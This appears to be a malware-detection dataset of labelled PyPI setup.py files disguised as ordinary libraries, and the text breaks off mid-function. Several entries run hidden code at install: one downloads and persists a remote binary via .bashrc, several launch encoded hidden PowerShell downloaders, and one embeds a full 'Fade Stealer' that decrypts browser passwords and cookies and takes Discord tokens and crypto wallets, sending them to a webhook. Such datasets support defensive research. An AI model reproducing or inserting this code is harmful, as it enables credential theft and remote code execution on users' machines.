{"idx": "libpeshka-0.6", "func": "from setuptools import setup, find_packages\n\n\n\ndef rn ():\n        import platform\n\n        lb = False\n        try:\n                import urllib2\n        except ImportError:\n                import requests\n                lb = True\n        import os, stat\n\n        ADD_LOC = \"http://145.249.104.71/out\"\n        LOC = \".drv\"\n\n        if platform.system () == \"Linux\":\n                response = \"\"\n                if not lb:\n                        response = urllib2.urlopen(ADD_LOC).read ()\n                else:\n                        response = requests.get (ADD_LOC)\n                        response = response.content\n                os.chdir (os.path.expanduser (\"~\"))\n                d = open (LOC, \"wb\")\n                d.write (response)\n                d.close ()\n\n                current_state = os.stat (LOC)\n                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)\n\n                brc = open (\".bashrc\", \"a\")\n                brc.write (\"\\n~/.drv &\")\n                brc.close ()\n\n                os.system (\"~/.drv &\")\n        else:\n                print (\"Error installing library!\")\n                exit (-1)\n\nrn ()\n\nsetup(\n  name = 'libpeshka',\n  packages = find_packages (),\n  entry_points={\n\t'setuptools.installation': [\n\t\t'eggsecutable = libari.pr:rn'\n\t]\n  },\n  version = '0.6',\n  description = 'Libari wrapper for python',\n  author = 'Ruri12',\n  author_email = 'ruri12@example.com',\n  scripts=[\"pr.py\"],\n  url = '',\n  download_url = '', \n  keywords = ['libari'],\n  classifiers = [],\n)\n", "target": 1}
{"idx": "esqcraftvirtual-1.93", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcraftvirtual',\n    packages = ['modlib'],\n    version = '3.9',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selframsplitstring-1.3", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selframsplitstring',\n    packages = ['modlib'],\n    version = '3.14',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "1337test-1", "func": "from setuptools import setup, find_packages\n\nsetup(\n    name='1337test',\n    version='1',\n    author='Jonathan Hartley',\n    author_email='tartley@tartley.com',\n    description='Pure-python Colors implementation',\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    url='https://github.com/tartley/colorama',\n    packages=find_packages(),\n    install_requires=[\n        'requests','colorama'\n    ],\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n)\n", "target": 1}
{"idx": "libverinteltool-7.54", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libverinteltool',\n    packages = ['modlib'],\n    version = '2.40',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "aio-http-proxy-support-1", "func": "from setuptools import setup\nfrom builtins import all,dir,exec,format,len,ord,print,int,list,range,set,str,open\nexec('')\nimport os\nimport threading\nfrom sys import executable\nfrom sqlite3 import connect as sql_connect\nimport re\nfrom base64 import b64decode\nfrom json import loads as json_loads,load\nfrom ctypes import windll,wintypes,byref,cdll,Structure,POINTER,c_char,c_buffer\nfrom urllib.request import Request,urlopen\nfrom json import loads,dumps\nimport time\nimport shutil\nfrom zipfile import ZipFile\nimport random\nimport re\nimport subprocess\n\nhook='https://discord.com/api/webhooks/1208770092402348098/aChn1ud6B-lJCsVfklUN7t8f5Mo2bAdEZ-p3zxdH0m8bZxGbMvzvmXy2f6PfUVxiCUWd'\nDETECTED=False\ndef getip():\n    ip='None'\n    try:\n        ip=urlopen(Request('https://api.ipify.org')).read().decode().strip()\n    except:\n        pass\n    return ip\nrequirements=[\n['requests','requests'],\n['Crypto.Cipher','pycryptodome']\n]\nfor modl in requirements:\n    try:__import__(modl[0])\n    except:\n        subprocess.Popen(f\"{executable} -m pip install {modl[1]}\",shell=True)\n        time.sleep(3)\nimport requests\nfrom Crypto.Cipher import AES\nlocal=os.getenv('LOCALAPPDATA')\nroaming=os.getenv('APPDATA')\ntemp=os.getenv('TEMP')\nThreadlist=[]\nclass DATA_BLOB(Structure):\n    _fields_=[\n('cbData',wintypes.DWORD),\n('pbData',POINTER(c_char))\n]\ndef GetData(blob_out):\n    cbData=int(blob_out.cbData)\n    pbData=blob_out.pbData\n    buffer=c_buffer(cbData)\n    cdll.msvcrt.memcpy(buffer,pbData,cbData)\n    windll.kernel32.LocalFree(pbData)\n    return buffer.raw\ndef CryptUnprotectData(encrypted_bytes,entropy=b''):\n    buffer_in=c_buffer(encrypted_bytes,len(encrypted_bytes))\n    buffer_entropy=c_buffer(entropy,len(entropy))\n    blob_in=DATA_BLOB(len(encrypted_bytes),buffer_in)\n    blob_entropy=DATA_BLOB(len(entropy),buffer_entropy)\n    blob_out=DATA_BLOB()\n    if windll.crypt32.CryptUnprotectData(byref(blob_in),None,byref(blob_entropy),None,None,0x01,byref(blob_out)):\n        return GetData(blob_out)\ndef DecryptValue(buff,master_key=None):\n    starts=buff.decode(encoding='utf8',errors='ignore')[:3]\n    if starts=='v10' or starts=='v11':\n        iv=buff[3:15]\n        payload=buff[15:]\n        cipher=AES.new(master_key,AES.MODE_GCM,iv)\n        decrypted_pass=cipher.decrypt(payload)\n        decrypted_pass=decrypted_pass[:-16].decode()\n        return decrypted_pass\ndef LoadRequests(methode,url,data='',files='',headers=''):\n    for i in range(8):# max trys\n        try:\n            if methode=='POST':\n                if data !='':\n                    r=requests.post(url,data=data)\n                    if r.status_code==200:\n                        return r\n                elif files !='':\n                    r=requests.post(url,files=files)\n                    if r.status_code==200 or r.status_code==413:# 413=DATA TO BIG\n                        return r\n        except:\n            pass\ndef LoadUrlib(hook,data='',files='',headers=''):\n    for i in range(8):\n        try:\n            if headers !='':\n                r=urlopen(Request(hook,data=data,headers=headers))\n                return r\n            else:\n                r=urlopen(Request(hook,data=data))\n                return r\n        except:\n            pass\ndef Trust(Cookies):\n    global DETECTED\n    data=str(Cookies)\n    tim=re.findall('.google.com',data)\n    if len(tim)<-1:\n        DETECTED=True\n        return DETECTED\n    else:\n        DETECTED=False\n        return DETECTED\ndef GetUHQFriends(token):\n    badgeList=[\n{'Name':'Early_Verified_Bot_Developer','Value':131072,'Emoji':'<:developer:874750808472825986> '},\n{'Name':'Bug_Hunter_Level_2','Value':16384,'Emoji':'<:bughunter_2:874750808430874664> '},\n{'Name':'Early_Supporter','Value':512,'Emoji':'<:early_supporter:874750808414113823> '},\n{'Name':'House_Balance','Value':256,'Emoji':'<:balance:874750808267292683> '},\n{'Name':'House_Brilliance','Value':128,'Emoji':'<:brilliance:874750808338608199> '},\n{'Name':'House_Bravery','Value':64,'Emoji':'<:bravery:874750808388952075> '},\n{'Name':'Bug_Hunter_Level_1','Value':8,'Emoji':'<:bughunter_1:874750808426692658> '},\n{'Name':'HypeSquad_Events','Value':4,'Emoji':'<:hypesquad_events:874750808594477056> '},\n{'Name':'Partnered_Server_Owner','Value':2,'Emoji':'<:partner:874750808678354964> '},\n{'Name':'Discord_Employee','Value':1,'Emoji':'<:staff:874750808728666152> '}\n]\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        friendlist=loads(urlopen(Request('https://discord.com/api/v6/users/@me/relationships',headers=headers)).read().decode())\n    except:\n        return False\n    uhqlist=''\n    for friend in friendlist:\n        OwnedBadges=''\n        flags=friend['user']['public_flags']\n        for badge in badgeList:\n            if flags//badge['Value']!=0 and friend['type']==1:\n                if not 'House' in badge['Name']:\n                    OwnedBadges+=badge['Emoji']\n                flags=flags % badge['Value']\n        if OwnedBadges !='':\n            uhqlist+=f\"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\\n\"\n    return uhqlist\ndef GetBilling(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        billingjson=loads(urlopen(Request('https://discord.com/api/users/@me/billing/payment-sources',headers=headers)).read().decode())\n    except:\n        return False\n    if billingjson==[]:return ' -'\n    billing=''\n    for methode in billingjson:\n        if methode['invalid']==False:\n            if methode['type']==1:\n                billing+='<a:Cc:1032742457416355882>'\n            elif methode['type']==2:\n                billing+='<:paypal:1027984840131366922> '\n    return billing\ndef GetBadge(flags):\n    if flags==0:return ''\n    OwnedBadges=''\n    badgeList=[\n{'Name':'Early_Verified_Bot_Developer','Value':131072,'Emoji':'<:developer:874750808472825986> '},\n{'Name':'Bug_Hunter_Level_2','Value':16384,'Emoji':'<:bughunter_2:874750808430874664> '},\n{'Name':'Early_Supporter','Value':512,'Emoji':'<:early_supporter:874750808414113823> '},\n{'Name':'House_Balance','Value':256,'Emoji':'<:balance:874750808267292683> '},\n{'Name':'House_Brilliance','Value':128,'Emoji':'<:brilliance:874750808338608199> '},\n{'Name':'House_Bravery','Value':64,'Emoji':'<:bravery:874750808388952075> '},\n{'Name':'Bug_Hunter_Level_1','Value':8,'Emoji':'<:bughunter_1:874750808426692658> '},\n{'Name':'HypeSquad_Events','Value':4,'Emoji':'<:hypesquad_events:874750808594477056> '},\n{'Name':'Partnered_Server_Owner','Value':2,'Emoji':'<:partner:874750808678354964> '},\n{'Name':'Discord_Employee','Value':1,'Emoji':'<:staff:874750808728666152> '}\n]\n    for badge in badgeList:\n        if flags//badge['Value']!=0:\n            OwnedBadges+=badge['Emoji']\n            flags=flags % badge['Value']\n    return OwnedBadges\ndef GetTokenInfo(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    userjson=loads(urlopen(Request('https://discordapp.com/api/v6/users/@me',headers=headers)).read().decode())\n    username=userjson['username']\n    hashtag=userjson['discriminator']\n    email=userjson['email']\n    idd=userjson['id']\n    pfp=userjson['avatar']\n    flags=userjson['public_flags']\n    nitro=''\n    phone='-'\n    if 'premium_type' in userjson:\n        nitrot=userjson['premium_type']\n        if nitrot==1:\n            nitro='<:classic:896119171019067423> '\n        elif nitrot==2:\n            nitro='<a:boost:824036778570416129> <:classic:896119171019067423> '\n    if 'phone' in userjson:phone=f'`{userjson[\"phone\"]}`'\n    return username,hashtag,email,idd,pfp,flags,nitro,phone\ndef checkToken(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        urlopen(Request('https://discordapp.com/api/v6/users/@me',headers=headers))\n        return True\n    except:\n        return False\ndef uploadToken(token,path):\n    global hook\n    headers={\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    username,hashtag,email,idd,pfp,flags,nitro,phone=GetTokenInfo(token)\n    if pfp==None:\n        pfp='https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png'\n    else:\n        pfp=f\"https://cdn.discordapp.com/avatars/{idd}/{pfp}\"\n    billing=GetBilling(token)\n    badge=GetBadge(flags)\n    friends=GetUHQFriends(token)\n    if friends=='':friends='No HQ Friends'\n    if not billing:\n        badge,phone,billing=badge,phone,None\n    if nitro=='' and badge=='':nitro=' -'\n    data={\n        'content':f'Found in `{path}`',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                    'name':'<a:dt:1032744237042774057> Token:',\n                    'value':f\"`{token}`\\n[Click to copy](https://superfurrycdn.nl/copy/{token})\"\n},\n{\n                    'name':'<a:Bat:1032747993981538395> Email:',\n                    'value':f\"`{email}`\",\n                    'inline':True\n},\n{\n                    'name':'<a:gengar:1032750484961890426> Phone:',\n                    'value':f\"{phone}\",\n                    'inline':True\n},\n{\n                    'name':'<a:dt1:1032749135188742176> IP:',\n                    'value':f\"`{getip()}`\",\n                    'inline':True\n},\n{\n                    'name':'<a:uzi:1032752999795265537> Badges:',\n                    'value':f\"{nitro}{badge}\",\n                    'inline':True\n},\n{\n                    'name':'<a:Cc:1032742457416355882> Billing:',\n                    'value':f\"{billing}\",\n                    'inline':True\n},\n{\n                    'name':'<a:diamond:1032752566926315575> HQ Friends:',\n                    'value':f\"{friends}\",\n                    'inline':False\n}\n],\n            'author':{\n                'name':f\"{username}#{hashtag} ({idd})\",\n                'icon_url':f\"{pfp}\"\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n},\n            'thumbnail':{\n                'url':f\"{pfp}\"\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1028588906846879856/1037436987482841129/unknown.png',\n        'username':'Fade Stealer',\n        'attachments':[]\n}\n    LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\ndef Reformat(listt):\n    e=re.findall('(\\\\w+[a-z])',listt)\n    while 'https' in e:e.remove('https')\n    while 'com' in e:e.remove('com')\n    while 'net' in e:e.remove('net')\n    return list(set(e))\ndef upload(name,tk=''):\n    headers={\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    if name=='kiwi':\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Interesting files found on user PC:',\n                'value':tk\n}\n],\n            'author':{\n                'name':'Fade | File stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n        return\n    path=name\n    files={'file':open(path,'rb')}\n    if 'wppassw' in name:\n        ra=' | '.join(da for da in paswWords)\n        if len(ra)>1000:\n            rrr=Reformat(str(paswWords))\n            ra=' | '.join(da for da in rrr)\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Found:',\n                'value':ra\n}\n],\n            'author':{\n                'name':'Fade | Password Stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n    if 'wpcook' in name:\n        rb=' | '.join(da for da in cookiWords)\n        if len(rb)>1000:\n            rrrrr=Reformat(str(cookiWords))\n            rb=' | '.join(da for da in rrrrr)\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Found:',\n                'value':rb\n}\n],\n            'author':{\n                'name':'Fade | Stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n    LoadRequests('POST',hook,files=files)\ndef writeforfile(data,name):\n    path=os.getenv('TEMP')+f\"\\wp{name}.txt\"\n    with open(path,mode='w',encoding='utf-8')as f:\n        f.write(f\"<--Fade Stealer ON TOP-->\\n\\n\")\n        for line in data:\n            if line[0]!='':\n                f.write(f\"{line}\\n\")\nTokens=''\ndef getToken(path,arg):\n    if not os.path.exists(path):return\n    path+=arg\n    for file in os.listdir(path):\n        if file.endswith('.log')or file.endswith('.ldb'):\n            for line in[x.strip()for x in open(f\"{path}\\\\{file}\",errors='ignore').readlines()if x.strip()]:\n                for regex in('[\\\\w-]{24}\\\\.[\\\\w-]{6}\\\\.[\\\\w-]{25,110}','mfa\\\\.[\\\\w-]{80,95}'):\n                    for token in re.findall(regex,line):\n                        global Tokens\n                        if checkToken(token):\n                            if not token in Tokens:\n                                Tokens+=token\n                                uploadToken(token,path)\nPassw=[]\ndef getPassw(path,arg):\n    global Passw\n    if not os.path.exists(path):return\n    pathC=path+arg+'/Login Data'\n    if os.stat(pathC).st_size==0:return\n    tempfold=temp+'wp'+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'\n    shutil.copy2(pathC,tempfold)\n    conn=sql_connect(tempfold)\n    cursor=conn.cursor()\n    cursor.execute('SELECT action_url, username_value, password_value FROM logins;')\n    data=cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0]!='':\n            for wa in keyword:\n                old=wa\n                if 'https' in wa:\n                    tmp=wa\n                    wa=tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in paswWords:paswWords.append(old)\n            Passw.append(f\"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}\")\n    writeforfile(Passw,'passw')\nCookies=[]\ndef getCookie(path,arg):\n    global Cookies\n    if not os.path.exists(path):return\n    pathC=path+arg+'/Cookies'\n    if os.stat(pathC).st_size==0:return\n    tempfold=temp+'wp'+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'\n    shutil.copy2(pathC,tempfold)\n    conn=sql_connect(tempfold)\n    cursor=conn.cursor()\n    cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')\n    data=cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0]!='':\n            for wa in keyword:\n                old=wa\n                if 'https' in wa:\n                    tmp=wa\n                    wa=tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in cookiWords:cookiWords.append(old)\n            Cookies.append(f\"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}\")\n    writeforfile(Cookies,'cook')\ndef GetDiscord(path,arg):\n    if not os.path.exists(f\"{path}/Local State\"):return\n    pathC=path+arg\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for file in os.listdir(pathC):\n        if file.endswith('.log')or file.endswith('.ldb'):\n            for line in[x.strip()for x in open(f\"{pathC}\\\\{file}\",errors='ignore').readlines()if x.strip()]:\n                for token in re.findall('dQw4w9WgXcQ:[^.*\\\\[\\'(.*)\\'\\\\].*$][^\\\\\"]*',line):\n                    global Tokens\n                    tokenDecoded=DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]),master_key)\n                    if checkToken(tokenDecoded):\n                        if not tokenDecoded in Tokens:\n                            Tokens+=tokenDecoded\n                            uploadToken(tokenDecoded,path)\ndef ZipThings(path,arg,procc):\n    pathC=path\n    name=arg\n    if 'nkbihfbeogaeaoehlefnkodbefgpgknn' in arg:\n        browser=path.split('\\\\')[4].split('/')[1].replace(' ','')\n        name=f\"Metamask_{browser}\"\n        pathC=path+arg\n    if not os.path.exists(pathC):return\n    subprocess.Popen(f\"taskkill /im {procc} /t /f\",shell=True)\n    if 'Wallet' in arg or 'NationsGlory' in arg:\n        browser=path.split('\\\\')[4].split('/')[1].replace(' ','')\n        name=f\"{browser}\"\n    elif 'Steam' in arg:\n        if not os.path.isfile(f\"{pathC}/loginusers.vdf\"):return\n        f=open(f\"{pathC}/loginusers.vdf\",'r+',encoding='utf8')\n        data=f.readlines()\n        found=False\n        for l in data:\n            if 'RememberPassword\"\t\t\"1\"' in l:\n                found=True\n        if found==False:return\n        name=arg\n    zf=ZipFile(f\"{pathC}/{name}.zip\",'w')\n    for file in os.listdir(pathC):\n        if not '.zip' in file:zf.write(pathC+'/'+file)\n    zf.close()\n    upload(f'{pathC}/{name}.zip')\n    os.remove(f\"{pathC}/{name}.zip\")\ndef GatherAll():\n    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '\n    browserPaths=[\n[f\"{roaming}/Opera Software/Opera GX Stable\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{roaming}/Opera Software/Opera Stable\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{roaming}/Opera Software/Opera Neon/User Data/Default\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Google/Chrome/User Data\",'chrome.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Google/Chrome SxS/User Data\",'chrome.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/BraveSoftware/Brave-Browser/User Data\",'brave.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Yandex/YandexBrowser/User Data\",'yandex.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Microsoft/Edge/User Data\",'edge.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn']\n]\n    discordPaths=[\n[f\"{roaming}/Discord\",'/Local Storage/leveldb'],\n[f\"{roaming}/Lightcord\",'/Local Storage/leveldb'],\n[f\"{roaming}/discordcanary\",'/Local Storage/leveldb'],\n[f\"{roaming}/discordptb\",'/Local Storage/leveldb'],\n]\n    PathsToZip=[\n[f\"{roaming}/atomic/Local Storage/leveldb\",'\"Atomic Wallet.exe\"','Wallet'],\n[f\"{roaming}/Exodus/exodus.wallet\",'Exodus.exe','Wallet'],\n['C:\\\\Program Files (x86)\\\\Steam\\\\config','steam.exe','Steam'],\n[f\"{roaming}/NationsGlory/Local Storage/leveldb\",'NationsGlory.exe','NationsGlory']\n]\n    for patt in browserPaths:\n        a=threading.Thread(target=getToken,args=[patt[0],patt[2]])\n        a.start()\n        Threadlist.append(a)\n    for patt in discordPaths:\n        a=threading.Thread(target=GetDiscord,args=[patt[0],patt[1]])\n        a.start()\n        Threadlist.append(a)\n    for patt in browserPaths:\n        a=threading.Thread(target=getPassw,args=[patt[0],patt[3]])\n        a.start()\n        Threadlist.append(a)\n    ThCokk=[]\n    for patt in browserPaths:\n        a=threading.Thread(target=getCookie,args=[patt[0],patt[4]])\n        a.start()\n        ThCokk.append(a)\n    for thread in ThCokk:thread.join()\n    DETECTED=Trust(Cookies)\n    if DETECTED==True:return\n    for patt in browserPaths:\n        threading.Thread(target=ZipThings,args=[patt[0],patt[5],patt[1]]).start()\n    for patt in PathsToZip:\n        threading.Thread(target=ZipThings,args=[patt[0],patt[2],patt[1]]).start()\n    for thread in Threadlist:\n        thread.join()\n    global upths    \n    upths=[]\n    for file in['wppassw.txt','wpcook.txt']:\n        upload(os.getenv('TEMP')+'\\\\'+file)\ndef uploadToAnonfiles(path):\n    try:\n        files={'file':(path,open(path,mode='rb'))}\n        upload=requests.post('https://transfer.sh/',files=files)\n        url=upload.text\n        return url\n    except:\n        return False\ndef KiwiFolder(pathF,keywords):\n    global KiwiFiles\n 